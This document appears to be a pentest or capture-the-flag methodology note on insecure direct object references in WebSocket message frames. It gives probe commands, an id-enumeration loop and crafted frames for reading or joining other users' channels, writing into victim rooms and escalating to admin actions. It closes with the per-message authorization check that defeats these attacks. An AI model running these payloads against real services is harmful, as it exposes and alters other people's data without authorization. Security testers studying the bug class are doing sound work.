# Message-IDOR — the per-frame object-reference gap, worked

## The dominant message-side bug

A `id`/`room`/`user_id`/`channel`/`conversation`/`document`/`object`
field in a frame that names another principal's resource, with no
per-message ownership check. The HTTP `/api/objects/{id}` enforces
ownership; the `{"action":"read","id":...}` frame often does not.

## The schema-field hunt

```javascript
// the bundle names every id-carrying field
{"action":"read","id":"<uid>"}
{"action":"history","room":"<room>"}
{"action":"get","user_id":<n>}
{"action":"subscribe","channel":"<chan>"}
{"action":"open","conversation":"<conv>"}
{"action":"join","document":"<doc>"}
{"type":"load","object":"<obj>"}
```

`web-source-map`/`bundle_miner` recover the action+field schema; grep
the bundle for `id`/`room`/`user`/`channel`/`conv`/`doc`.

## The mutation sweep — one field per connection

```bash
# the baseline — your own object
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=mine' --message '{"action":"read","id":"me"}'
# the IDOR — another's object id, same session
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=mine' --message '{"action":"read","id":"victim"}'
```

One field per connection — two concurrent mutations make the reply
unattributable.

## The id-space sweep — the enum + IDOR composite

A numeric/sequential `id`/`room`/`conversation` — sweep the namespace:

```javascript
for (let id=1; id<=50; id++) ws.send(JSON.stringify({action:"read",id}));
```

Every frame that returns another's object is a message-IDOR; the sweep
enumerates the namespace (enum) AND reads it (IDOR).

## The subscribe/join gap

```json
{"action":"subscribe","channel":"admin-feed"}
{"action":"join","room":"secret-room"}
{"action":"subscribe","channel":"user-<other>"}
```

A `subscribe`/`join`/`listen`/`watch` to a channel/room/stream the
subscriber should not reach — a channel-membership IDOR; the frames
that flow in are the data read.

## The `to`/`target` routing gap

```json
{"action":"send","to":"admin","text":"..."}
{"action":"msg","room":"victim-room","text":"..."}
{"action":"broadcast","text":"..."}   // a broadcast the UI hides
```

A `to`/`target`/`room`/`channel` the sender controls — write into a
channel/queue/DM the sender should not write; a `broadcast` every
client sees.

## The composite — the enum + IDOR + privilege chain

```
{"action":"read","id":"admin"}   ->  the admin's object (IDOR)
  -> the admin object's flag field / a privileged role
  -> {"action":"admin","cmd":"flag"} -> a privileged action
```

## The falsifier — a real per-message authz

Every frame's `id`/`room`/`channel`/`to` re-checked against the
handshake's identity — a mutated frame rejected with a uniform
`{"error":"forbidden"}` — the channel carries its own authz.

## The message-IDOR boundary

- `web-websocket` — the per-frame object-reference gap
- `web-idor` — the same bug on an HTTP object-id (the HTTP twin)
- a frame the schema accepts that the HTTP API would 403 is the
  differential — record which transport allowed it
